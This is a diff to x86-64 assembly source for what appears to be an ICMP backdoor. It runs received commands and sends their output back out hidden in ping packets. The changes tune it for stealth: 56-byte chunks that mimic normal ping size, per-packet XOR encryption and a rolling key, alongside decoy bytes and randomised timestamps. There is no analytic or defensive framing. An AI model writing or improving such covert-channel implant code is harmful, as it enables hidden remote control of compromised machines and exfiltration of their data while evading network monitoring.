@@ -28,7 +28,7 @@ section .data
         mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                     db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
         ; -------------------------------------
-        payload times 1000 db 0 ; Command output payload (1000 bytes chunk)
+        payload times 56 db 0 ; Command output payload (56 bytes chunk)
         payload_len equ $ - payload 
     
     newline db 10               ; ASCII \n
@@ -263,9 +263,9 @@ _read_loop:
 
 _read_done:
     ; --- ENCRYPTION PHASE ---
-    lea rsi, [full_response]
-    mov rcx, r14                    
-    call _xor_cipher                
+    ;lea rsi, [full_response]
+    ;mov rcx, r14                    
+    ;call _xor_cipher                
     
     mov rax, 3                      ; sys_close (Close memfd)
     syscall
@@ -277,20 +277,20 @@ _chunk_loop:
     cmp r14, 0
     jle .check_last_chunk           
 
-    ; FRAGMENTATION: Split output into 1000-byte chunks
-    cmp r14, 1000           
+    ; FRAGMENTATION: Split output into 56-byte chunks
+    cmp r14, 56           
     jg .set_max_chunk               
     mov r12, r14            
     jmp .copy_data
 
 .set_max_chunk:
-    mov r12, 1000
+    mov r12, 56
 
 .copy_data:
     cld
     lea rdi, [icmp_packet + 32]     ; Write data after 8 (Header) + 24 (Mimicry)
     xor al, al                      
-    mov rcx, 1000                   
+    mov rcx, 56                   
     rep stosb                       
 
     ; Update dynamic timestamp for stealth
@@ -303,6 +303,9 @@ _chunk_loop:
     mov rcx, r12
     rep movsb                       
 
+    lea rsi, [icmp_packet + 32]
+    mov rcx, r12
+    call _xor_cipher
 .packet_send:
     
     call _checksum_cal
@@ -344,7 +347,7 @@ _chunk_loop:
 
 .check_last_chunk:
     ; Check if an EOF packet is needed
-    cmp r12, 1000                   
+    cmp r12,56                    
     jne _sniff                      
 
     ; Send 1-byte EOF packet
@@ -353,7 +356,7 @@ _chunk_loop:
     cld
     lea rdi, [icmp_packet + 32]
     xor al, al
-    mov rcx, 1000
+    mov rcx, 56
     rep stosb                       
     
     rdtsc
@@ -410,10 +413,14 @@ _xor_cipher:
     test rcx, rcx                   
     jz .done                        
     push rsi                        
+    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
+    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
 .loop:
-    xor byte [rsi], 0x42            ; Simple symmetric XOR (Key: 0x42)
+    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
+    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
     inc rsi                         
     loop .loop                      
+    pop rdx                         
     pop rsi                         
 .done:
     ret
